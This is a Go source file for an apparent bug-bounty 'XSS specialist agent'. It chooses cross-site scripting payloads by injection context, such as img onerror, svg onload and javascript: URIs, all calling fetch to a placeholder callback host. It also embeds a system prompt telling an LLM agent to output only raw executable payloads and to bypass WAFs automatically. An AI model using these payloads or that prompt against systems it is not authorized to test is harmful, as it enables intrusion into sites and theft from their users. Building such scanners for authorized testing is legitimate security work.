// Package xss implements the XSS specialist agent.
//
// This is a Go-native implementation that processes XSS work items from the specialist queue.
//
// It supports:
//   - Reflected XSS detection via probe injection + response analysis
//   - DOM-based XSS via JavaScript source/sink pattern matching
//   - Stored XSS via multi-request correlation
//   - WAF bypass with payload mutation
//   - OOB validation via Interactsh callbacks (future)
package xss

import (
	"context"
	"fmt"
	"strings"

	"github.com/bb-agent/mirage/internal/agent/base"
	"github.com/bb-agent/mirage/internal/queue"
)

// XSSType categorizes the XSS variant.
type XSSType string

const (
	Reflected XSSType = "reflected"
	Stored    XSSType = "stored"
	DOM       XSSType = "dom"
)

// Agent implements the Specialist interface for XSS vulnerability detection.
type Agent struct {
	systemPrompt string
}

// New creates a new XSS specialist agent.
func New() *Agent {
	return &Agent{
		systemPrompt: defaultSystemPrompt,
	}
}

func (a *Agent) Name() string         { return "XSS Agent" }
func (a *Agent) ID() string           { return "xss" }
func (a *Agent) SystemPrompt() string { return a.systemPrompt }

// ProcessItem processes a single XSS work item from the queue.
// This is called by the Worker for each item dequeued.
func (a *Agent) ProcessItem(ctx context.Context, item *queue.Item) ([]*base.Finding, error) {
	// Extract work item details
	targetURL, _ := item.Payload["target"].(string)
	vulnContext, _ := item.Payload["context"].(string)
	priority, _ := item.Payload["priority"].(string)

	if targetURL == "" {
		return nil, fmt.Errorf("missing target URL in work item")
	}

	// Phase 1: Context Analysis
	// Determine the injection context (HTML body, attribute, JS string, URL, etc.)
	injectionCtx := analyzeContext(vulnContext)

	// Phase 2: Payload Generation
	// Select payloads based on context
	payloads := generatePayloads(injectionCtx)

	// Phase 3: Create findings for each viable payload
	// In the future, this will actually send HTTP requests and validate
	var findings []*base.Finding

	for _, payload := range payloads {
		f := &base.Finding{
			Type:       "XSS",
			URL:        targetURL,
			Payload:    payload,
			Severity:   mapPriorityToSeverity(priority),
			Confidence: 0.0, // Will be set by validation phase
			Evidence: map[string]interface{}{
				"context":       injectionCtx,
				"xss_type":      string(Reflected),
				"payload_class": classifyPayload(payload),
			},
			Method: "GET",
		}
		findings = append(findings, f)
	}

	return findings, nil
}

// analyzeContext determines the injection context from planner notes.
func analyzeContext(context string) string {
	context = strings.ToLower(context)
	switch {
	case strings.Contains(context, "attribute"):
		return "attribute_quoted"
	case strings.Contains(context, "javascript"), strings.Contains(context, "script"):
		return "javascript_string"
	case strings.Contains(context, "href"), strings.Contains(context, "src"):
		return "href"
	case strings.Contains(context, "dom"):
		return "dom"
	default:
		return "html_text"
	}
}

// generatePayloads creates context-appropriate XSS payloads.
func generatePayloads(injectionCtx string) []string {
	switch injectionCtx {
	case "html_text":
		return []string{
			`<img src=x onerror=fetch('CALLBACK_URL')>`,
			`<svg onload=fetch('CALLBACK_URL')>`,
			`<details open ontoggle=fetch('CALLBACK_URL')>`,
		}
	case "attribute_quoted":
		return []string{
			`"><img src=x onerror=fetch('CALLBACK_URL')>`,
			`" onfocus=fetch('CALLBACK_URL') autofocus="`,
			`'><svg onload=fetch('CALLBACK_URL')>`,
		}
	case "javascript_string":
		return []string{
			`";fetch('CALLBACK_URL');//`,
			`';fetch('CALLBACK_URL');//`,
			"\\`;fetch('CALLBACK_URL');//",
		}
	case "href":
		return []string{
			`javascript:fetch('CALLBACK_URL')`,
			`data:text/html,<script>fetch('CALLBACK_URL')</script>`,
		}
	case "dom":
		return []string{
			`#<img src=x onerror=fetch('CALLBACK_URL')>`,
			`javascript:fetch('CALLBACK_URL')`,
		}
	default:
		return []string{
			`<script>fetch('CALLBACK_URL')</script>`,
		}
	}
}

// classifyPayload returns the bypass technique class.
func classifyPayload(payload string) string {
	switch {
	case strings.Contains(payload, "onerror"):
		return "event_handler"
	case strings.Contains(payload, "onload"):
		return "event_handler"
	case strings.Contains(payload, "javascript:"):
		return "protocol_handler"
	case strings.Contains(payload, "<script>"):
		return "script_injection"
	case strings.Contains(payload, "onfocus"):
		return "interactive_event"
	default:
		return "generic"
	}
}

func mapPriorityToSeverity(priority string) string {
	switch strings.ToLower(priority) {
	case "critical":
		return "critical"
	case "high":
		return "high"
	case "medium":
		return "medium"
	case "low":
		return "low"
	default:
		return "medium"
	}
}

// defaultSystemPrompt is the embedded system prompt for the XSS agent.
// In production this will be loaded from an external markdown file.
const defaultSystemPrompt = `You are an elite XSS (Cross-Site Scripting) specialist with deep expertise in:
- All XSS contexts: HTML text, attributes, JavaScript, URLs, CSS
- WAF/filter bypass techniques (case variation, encoding, alternative event handlers)
- Modern browser behaviors and CSP bypass
- Framework-specific attacks (AngularJS CSTI, Vue.js template injection)

Your task: Analyze the provided target and generate payloads that will execute JavaScript.

RULES:
1. Generate ONLY raw, executable payloads -- no explanations or instructions
2. Prefer visual proof payloads (DOM modification) over alert() for PoC
3. Consider the injection context (HTML, attribute, JS string, URL) when crafting payloads
4. If WAF is detected, automatically attempt bypass techniques
5. Report confidence level (0.0-1.0) based on reflection analysis`
